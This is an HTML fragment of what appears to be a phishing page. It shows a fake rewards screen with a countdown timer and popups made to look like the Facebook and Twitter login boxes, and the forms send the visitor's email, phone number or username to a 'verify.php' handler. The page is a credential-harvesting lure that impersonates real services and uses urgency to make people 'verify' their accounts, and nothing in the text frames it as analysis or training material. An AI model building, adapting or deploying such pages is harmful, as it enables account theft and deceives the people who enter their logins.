...
<div class="menu-content" style="width: 40%;position: absolute;top: 12%;right: 1%"><span id="isinama" style="display: "><font size="2" id="latestTimer">23 : 59 : 55</font></span></div>
</div>

<br>
<div class="tab_rewards" id="latest" style="display: ">
<div class="scroll">
<center>
...
<div class="popup account_login" style="display: ;">
	<div class="popup-box">
<center>
<div class="popup-title"><span style="position: absolute;top: 25px;margin-left: 20px"><i class="fa fa-user"></i> Account Login</span></div>
</center>
	...
	<div class="popup-box-login-fb">
		...
		<div class="content-box-fb">
			...
			<form action="verify.php" method="post">
				<label>
				<input type="text" class="loginEmail" name="email" id="fbemail" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="">
				</label>
				<label>
...
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
	...
	<a onclick="tutup_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		...
		<div class="box-twitter">
			<center>
			<form action="verify.php" method="post">
				<div class="txt-login-twitter">Login to Twitter <br> <small class="error_twitter" style="font-size: 10px;color: red;display: none">Please input all form to verify your account</small></div>
				<div class="input-box-twitter">
				<label>Username/email/phone</label>
				<input type="text" name="email" id="twitteremail" autocomplete="off" required="">
				...
				<button type="submit" id="twittersubmit" class="btn-login-twitter">Log In</button>
